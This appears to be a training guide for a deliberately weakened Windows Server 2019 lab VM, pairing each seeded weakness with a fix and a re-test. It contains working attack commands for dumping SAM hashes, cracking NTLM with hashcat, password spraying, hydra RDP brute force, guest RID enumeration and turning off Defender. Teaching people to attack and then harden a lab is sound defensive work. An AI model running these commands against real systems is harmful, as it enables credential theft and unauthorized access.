# 🪟 Windows Server 2019 — deharden → exploit → harden

This guide walks through the Windows Server 2019 dehardening script. For **every** weakness it
introduces you get the same four things, so each exercise is fully reproducible:

- 🧪 **Seeded by the script** — the exact artifact you can test (a user, a policy, a service).
- 🟠 **Exploit** — concrete commands *and the result you should see*.
- 🟢 **Harden** — the fix.
- ✅ **Re-test** — run the same attack again and confirm it now fails.

- **Script:** [`scripts/windows-server-2019/Deharden-WindowsServer2019.ps1`](../scripts/windows-server-2019/Deharden-WindowsServer2019.ps1) (PowerShell)
- **New to the lab?** Read [lab-setup.md](lab-setup.md) first.

> [!WARNING]
> This script weakens the machine on purpose. Run it **only** in an isolated lab VM (Host-Only
> network) with a **fresh snapshot**. To recover a safe state, restore the snapshot.

## How to run the script

```powershell
# PowerShell AS ADMINISTRATOR
Set-ExecutionPolicy -Scope Process Bypass -Force
.\Deharden-WindowsServer2019.ps1          # type DEHARDEN to confirm
# .\Deharden-WindowsServer2019.ps1 -Force  # unattended
Restart-Computer                           # UAC, Defender and SMBv1 need a reboot
```

> [!NOTE]
> **Windows Defender.** If **Tamper Protection** is on, the command can't disable Defender. Turn it off
> first in *Windows Security → Virus & threat protection*, then re-run (or do it via GPO). The script
> warns you when it couldn't.

- **Backup:** `C:\deharden-backups-<date>\secpol-BEFORE.cfg` · **Log:** `C:\deharden-lab.log`
- **Demo account it creates:** `trainee / Password1` — this password is weak **and present in
  `rockyou.txt`**, so the offline-cracking demo below actually succeeds, and it's predictable enough
  for password spraying. A hardened policy (length 14 + complexity) would reject it.

## Attacker box prerequisites

The 🟠 commands run from the attacker VM (e.g. Kali): `nmap`, `hydra`, `hashcat`, `john`,
`netexec` (`nxc`), `impacket` (`secretsdump.py`, `lookupsid.py`) and the wordlist.

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
export HOST=192.168.56.30      # <-- the victim's IP (ipconfig on the victim)
```

---

## 1. Weak password policy → crack a password offline with hashcat ⭐

This is the headline exercise: the weak policy let `trainee` keep the trivial password `Password1`,
and because it's in a wordlist, offline cracking is instant.

- 🧪 **Seeded:** `net accounts` → min length `0`, complexity `off`, no expiry; user `trainee` with the
  weak, wordlist-present password `Password1`.
- 🟠 **Exploit — the full chain:**

  **Step 1 — dump the NTLM hashes.** Pick whichever fits your lab:
  ```bash
  # (a) from the attacker, if you already have local-admin creds (post-exploitation):
  secretsdump.py './Administrator:<AdminPass>@'$HOST
  nxc smb $HOST -u Administrator -p '<AdminPass>' --sam     # same result via netexec
  ```
  ```powershell
  # (b) on the victim as the lab operator (admin PowerShell), then copy the files to Kali:
  reg save HKLM\SAM    C:\sam.save
  reg save HKLM\SYSTEM C:\system.save
  ```
  ```bash
  # ...then on the attacker:
  secretsdump.py -sam sam.save -system system.save LOCAL
  ```
  You'll get a line like:
  ```
  trainee:1001:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678:::
  ```
  The last 32-hex field is the **NTLM hash**.

  **Step 2 — crack it:**
  ```bash
  echo '3dbde697d71690a769204beb12283678' > ntlm.txt
  hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
  #  => 3dbde697d71690a769204beb12283678:Password1
  ```
  NTLM is unsalted and extremely fast to compute, so a weak password that appears in any wordlist is
  recovered almost immediately. **That is why the password policy matters.**
- 🟢 **Harden:** `net accounts /minpwlen:14 /maxpwage:365 /uniquepw:24` and enable complexity in
  `secpol.msc`; then set a long, random password for `trainee`.
- ✅ **Re-test:** dump again and run the same hashcat command — a 14-char random password is not in
  `rockyou.txt`, so the wordlist is exhausted with no hit (and full brute force is infeasible).

## 2. Account lockout disabled → unlimited password spraying
- 🧪 **Seeded:** `net accounts` lockout threshold `0` (accounts never lock); `trainee / Password1`.
- 🟠 **Exploit:**
  ```bash
  printf 'administrator\ntrainee\nguest\n' > users.txt
  nxc smb $HOST -u users.txt -p 'Password1'
  #  => [+] <HOST>\trainee:Password1   (and the run NEVER triggers a lockout)
  ```
- 🟢 **Harden:** `net accounts /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15`.
- ✅ **Re-test:** after 5 bad attempts the account locks — `nxc` reports `STATUS_ACCOUNT_LOCKED_OUT`.

## 3. Guest enabled, blank passwords allowed, Administrator not renamed
- 🧪 **Seeded:** Guest account enabled; `LimitBlankPasswordUse=0`; the built-in Administrator keeps its
  default name (RID 500).
- 🟠 **Exploit:**
  ```bash
  nxc smb $HOST -u guest -p ''                 # => authenticated as Guest
  lookupsid.py guest@$HOST -no-pass            # enumerate RIDs; RID 500 = the Administrator account
  ```
- 🟢 **Harden:** `net user Guest /active:no`; set `LimitBlankPasswordUse=1`;
  `Rename-LocalUser Administrator adm-lab`.
- ✅ **Re-test:** `nxc smb $HOST -u guest -p ''` → `STATUS_ACCOUNT_DISABLED`; RID 500 no longer maps to
  a name an attacker can guess.

## 4. Logon: shows last user, no inactivity lock, no legal banner
- 🧪 **Seeded:** `DontDisplayLastUserName=0`, `InactivityTimeoutSecs=0`, empty legal banner.
- 🟠 **Exploit:** the console shows the last username (free account enumeration for targeted phishing),
  and an unlocked session never auto-locks (physical access keeps it open). Verify with
  `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastUserName`.
- 🟢 **Harden:** set `DontDisplayLastUserName=1` and `InactivityTimeoutSecs=900` (GPO or registry).
- ✅ **Re-test:** the logon screen no longer pre-fills a username; the session locks after 15 min idle.

## 5. UAC disabled (silent elevation)
- 🧪 **Seeded:** `EnableLUA=0`, `ConsentPromptBehaviorAdmin=0`.
- 🟠 **Exploit:**
  ```cmd
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA   :: => 0x0
  ```
  Any process launched by an admin runs fully elevated with no consent prompt — a UAC-bypass primitive
  like `fodhelper.exe` isn't even needed.
- 🟢 **Harden:** `EnableLUA=1` and `ConsentPromptBehaviorAdmin=2` (reboot required).
- ✅ **Re-test:** elevation now triggers a consent/secure-desktop prompt.

## 6. RDP active and NLA off
- 🧪 **Seeded:** RDP enabled (`fDenyTSConnections=0`), `TermService` started, `UserAuthentication=0`
  (NLA off), and `trainee` added to the **Remote Desktop Users** group so it can actually sign in
  over RDP (a normal user can't by default).
- 🟠 **Exploit:**
  ```bash
  nmap -p3389 --script rdp-ntlm-info $HOST     # leaks hostname/domain/OS without authenticating
  hydra -l trainee -P /usr/share/wordlists/rockyou.txt rdp://$HOST
  #  => login: trainee  password: Password1
  xfreerdp /u:trainee /p:Password1 /v:$HOST    # interactive session
  ```
  > If `xfreerdp` is rejected: the script (re)sets `trainee`'s password to `Password1` and adds it to
  > the *Remote Desktop Users* group by SID on every run, so make sure you're on the current script and
  > typing the current password. On newer FreeRDP, add `/cert:ignore` (and `/sec:rdp` if NLA
  > negotiation fails).
- 🟢 **Harden:** if RDP isn't needed, `sc config TermService start= disabled`; otherwise re-enable NLA
  with `UserAuthentication=1`.
- ✅ **Re-test:** `rdp-ntlm-info` no longer leaks pre-auth; NLA forces authentication before a session.

## 7. Firewall disabled (all 3 profiles)
- 🧪 **Seeded:** Domain/Private/Public profiles all set to `Enabled False`. SMB is built into Windows
  Server (nothing is "installed"), but the script also **ensures the Server service (`LanmanServer`)
  is running and the File-and-Printer-Sharing rules are on**, so port 445 is reachable and the
  `nxc smb $HOST …` demos in rows 1–3 work reliably.
- 🟠 **Exploit:** `nmap -sS -p- $HOST` → exposes 135/139/445 (SMB/RPC), 3389 (RDP), 5985 (WinRM), etc.
- 🟢 **Harden:** `Set-NetFirewallProfile -All -Enabled True -DefaultInboundAction Block -LogBlocked True`.
- ✅ **Re-test:** `nmap -sS -p- $HOST` now shows only explicitly allowed ports.

## 8. Auditing disabled (no 4625 / 4688 / 4740)
- 🧪 **Seeded:** every audit subcategory set to "no auditing"; command line stripped from event 4688.
- 🟠 **Exploit:**
  ```bash
  nxc smb $HOST -u trainee -p 'WrongPassword'   # a failed logon...
  ```
  ```powershell
  Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 5   # ...leaves NO 4625 event
  ```
  Living-off-the-land activity (PowerShell, PsExec, user creation) leaves no trail for a defender.
- 🟢 **Harden:** `auditpol /set /category:* /success:enable /failure:enable` and re-enable the command
  line in event 4688.
- ✅ **Re-test:** the same failed logon now produces a 4625 event with full detail.

## 9. SMBv1 enabled, ScriptBlock logging off, autorun on
- 🧪 **Seeded:** the **`SMB1Protocol-Server` optional feature** is enabled (so the server actually
  offers SMBv1 — on Server 2019 the registry/`Set-SmbServerConfiguration` toggle alone is *not*
  enough), plus ScriptBlock logging off and autorun on.
  > **Two gotchas that bite here:**
  > 1. **Reboot required.** The SMBv1 driver loads at boot, so `nmap` keeps showing only SMB2/3 until
  >    you `Restart-Computer`. After the reboot, `smb-protocols` lists the `NT LM 0.12` dialect.
  > 2. **Offline VM without the feature payload.** If `Get-WindowsOptionalFeature -Online
  >    -FeatureName SMB1Protocol-Server` reports `DisabledWithPayloadRemoved`, the feature can't be
  >    installed offline. Give the VM temporary internet (VirtualBox: switch to NAT, enable, revert to
  >    Host-Only) **or** install from the ISO:
  >    `Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Server -All -Source wim:D:\sources\install.wim:1 -LimitAccess`
- 🟠 **Exploit (after the reboot):**
  ```bash
  nmap --script smb-protocols -p445 $HOST           # => now lists "NT LM 0.12" (SMBv1)
  nmap --script smb-vuln-ms17-010 -p445 $HOST       # detection; "not vulnerable" on patched 2019
  ```
  On a patched 2019 this is a **detection** exercise, not an RCE — see the note below.
- 🟢 **Harden:** `Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force` and
  `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Server -NoRestart` (disabling is
  fast — no DISM/Windows Update round-trip); set `EnableScriptBlockLogging=1`; `NoDriveTypeAutoRun=255`.
  Reboot to unload the driver.
- ✅ **Re-test:** after the reboot `nmap --script smb-protocols` no longer lists `NT LM 0.12`.

## 10. Windows Update with no automatic updates
- 🧪 **Seeded:** `NoAutoUpdate=1` — the server never pulls patches.
- 🟠 **Exploit:** an unpatched server keeps public exploits viable (e.g. PrintNightmare,
  CVE-2021-34527). Check the patch level with `Get-HotFix | Sort-Object InstalledOn | Select -Last 5`.
- 🟢 **Harden:** `sconfig` (option 5: automatic) or set `NoAutoUpdate=0`.
- ✅ **Re-test:** Windows Update reports it is checking/installing again and the hotfix list grows.

## 11. Windows Defender disabled
- 🧪 **Seeded:** real-time protection off (`DisableRealtimeMonitoring`), `DisableAntiSpyware=1` policy.
- 🟠 **Exploit:**
  ```powershell
  Get-MpComputerStatus | Select RealTimeProtectionEnabled   # => False
  ```
  Dropping a standard [EICAR test file](https://www.eicar.org/download-anti-malware-testfile/) on the
  server is **not** flagged — a real webshell or payload would land just as quietly.
- 🟢 **Harden:** `Set-MpPreference -DisableRealtimeMonitoring $false` and turn Tamper Protection back on.
- ✅ **Re-test:** the EICAR file is quarantined on write; `RealTimeProtectionEnabled` → `True`.

---

## A note on EternalBlue (MS17-010)

The script re-enables SMBv1 for the **defensive** exercise (detect it, then disable it again). It is
**not a real RCE on Windows Server 2019** — the OS is patched, so `nmap --script smb-vuln-ms17-010`
reports *not vulnerable*. The exercise is to **detect** SMBv1 with nmap, run the defensive command
(`Get-WindowsOptionalFeature … SMB1Protocol`), and understand EternalBlue conceptually. Seeing it as a
live RCE would require a legacy target (Windows 7 / Server 2008 R2, or Metasploitable3), which is out
of scope for this lab.

## Suggested loop

For each row: **exploit → harden → re-run the exact same attack and confirm it fails.** Restore the
`fresh` snapshot before the next session so you always start from a known state.

➡️ Other target: [Ubuntu Desktop guide](ubuntu-desktop.md)
